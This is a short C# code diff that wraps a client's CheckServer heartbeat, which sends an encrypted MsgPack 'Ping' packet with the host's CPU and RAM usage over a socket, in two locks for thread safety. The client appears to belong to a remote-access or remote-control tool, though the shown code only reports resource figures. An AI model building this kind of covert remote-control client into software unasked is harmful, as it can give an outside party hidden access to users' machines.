@@ -199,23 +199,29 @@ namespace Client.Sockets
 
         public static void CheckServer(object obj)
         {
-            try
+            lock (SendSync)
             {
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "Ping";
-                msgpack.ForcePathObject("Message").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
+                lock (EndSendSync)
+                {
+                    try
+                    {
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "Ping";
+                        msgpack.ForcePathObject("Message").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
 
-                byte[] buffer = Settings.aes256.Encrypt(msgpack.Encode2Bytes());
-                byte[] buffersize = BitConverter.GetBytes(buffer.Length);
+                        byte[] buffer = Settings.aes256.Encrypt(msgpack.Encode2Bytes());
+                        byte[] buffersize = BitConverter.GetBytes(buffer.Length);
 
-                Client.Poll(-1, SelectMode.SelectWrite);
-                Client.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
-                Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
-            }
-            catch
-            {
-                IsConnected = false;
-                return;
+                        Client.Poll(-1, SelectMode.SelectWrite);
+                        Client.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
+                        Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
+                    }
+                    catch
+                    {
+                        IsConnected = false;
+                        return;
+                    }
+                }
             }
         }
     }
